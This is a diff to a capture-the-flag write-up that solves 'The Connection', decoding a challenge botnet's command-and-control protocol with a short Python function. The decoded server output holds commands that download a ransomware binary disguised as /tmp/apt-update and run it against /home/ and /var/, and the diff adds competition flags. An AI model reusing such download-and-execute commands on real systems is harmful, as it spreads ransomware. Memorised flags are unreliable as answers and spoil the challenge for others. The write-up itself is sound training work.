@@ -11,7 +11,7 @@ https://www.thecatch.cz/
 	- [`FLAG{rUn5-GwMR-IlY6-orZd}` Malware spreading](#malware-spreading)
 	- [`FLAG{XRC9-XyEE-tlTV-nOl7}` Attachment analysis](#attachment-analysis)
 	- [`FLAG{l03Y-BDjA-uB5v-PHVB}` Downloaded File](#downloaded-file)
-	- [The Connection](#the-connection)
+	- [`FLAG{kT0c-WTfc-S326-Jp1A}` The Connection](#the-connection)
 	- [Botnet master](#botnet-master)
 	- [Ransomware](#ransomware)
 - [`FLAG{aKAL-qQhH-MsAz-miUG}` Epilogue](#epilogue)
@@ -303,7 +303,43 @@ The original client does not connect anywhere as well. It contains the flag encr
 >
 > Good luck!
 
-http://challenges.thecatch.cz:20102/ransomvid1984.bin
+The given client sends `gwfj6723v5i9szya;;ready` message to the cnc server 78.128.216.92:20210, which returns data similar to this:
+```
+00000000  00 00 00 00 00 00 00 30  4e 54 4d 30 4d 7a 63 7a  |.......0NTM0Mzcz|
+00000010  4e 7a 4e 69 4d 32 49 7a  4e 44 63 35 4e 6a 45 32  |NzNiM2IzNDc5NjE2|
+00000020  4e 7a 64 68 65 58 70 7a  4f 57 6b 31 64 6a 4d 79  |NzdheXpzOWk1djMy|
+00000030  4e 7a 5a 71 5a 6e 64 6e                           |NzZqZndn|
+00000038
+```
+We can see, that first 8 bytes encodes length of the message. The message itself is base64 encoded and after decoding we got
+```
+13837383b3b347961677ayzs9i5v3276jfwg
+```
+Now, we can notice that the message ends with reversed id `gwfj6723v5i9szya`. So, let's reverse it
+```
+gwfj6723v5i9szya776169743b3b38373831
+```
+We got `776169743b3b38373831` hex string when we cut out 16 characters of ID from the beginning. They all look ascii printable and indeed they are `wait;;8781`.
+So, this is the recipe for message decoding:
+```python
+def decode(msg):
+    l = struct.unpack('>Q', msg[:8])[0]
+    rev = base64.b64decode(msg[8:8 + l])[::-1]
+    prefix, out = rev[:16].decode('ascii'), rev[16:]
+    out = binascii.unhexlify(out).decode('ascii')
+    return (prefix, out)
+```
+Let's wrap it to the [script](the_connection/solve.py) which will send the `;;ready` message continuously and it will print out decoded messages.
+Output of the script may look somehow like this.
+```
+('zc13psyobd5m4jvk', 'wait;;230')
+('zc13psyobd5m4jvk', 'download;;http://challenges.thecatch.cz:20102/ransomvid1984.bin;;/tmp/apt-update')
+('zc13psyobd5m4jvk', 'download;;http://challenges.thecatch.cz:20102/key1984.RV20;;/tmp/key')
+('zc13psyobd5m4jvk', 'execute;;/tmp/apt-update -k /tmp/key -p /home/')
+('zc13psyobd5m4jvk', 'execute;;/tmp/apt-update -k /tmp/key -p /var/')
+('zc13psyobd5m4jvk', 'wait;;12425')
+```
+The flag is hidden in this url [`http://challenges.thecatch.cz:20102/ransomvid1984.bin`](http://challenges.thecatch.cz:20102/ransomvid1984.bin).
 
 ### Botnet master
 
